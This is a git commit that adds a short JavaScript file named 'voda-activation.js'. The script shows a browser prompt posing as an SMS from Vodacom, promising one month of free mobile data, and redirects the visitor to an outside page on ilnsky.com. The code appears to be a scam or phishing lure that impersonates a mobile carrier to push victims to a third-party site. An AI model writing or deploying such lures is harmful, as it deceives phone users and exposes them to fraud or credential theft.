d09dc99946f69674e9a994e301d68ec0a710ee17
ukpeha55-stack <ukpeha55@gmail.com>
2026-01-30 16:20:59 +0100

    Create voda-activation.js

---
+++ voda-activation.js
@@ -0,0 +1,5 @@
+var password = '1 MOIS DE DONNÉES GRATUITES'
+password=prompt('SMS: Félicitations, votre numéro Vodacom est éligible à 1 mois de données gratuit. Appuyez sur OK pour vérifier.','1 MOIS DE DONNÉES GRATUITES');
+if (password != '1 MOIS DE DONNÉES GRATUITES') {
+location.href='https://ilnsky.com/vodacom.html';
+}
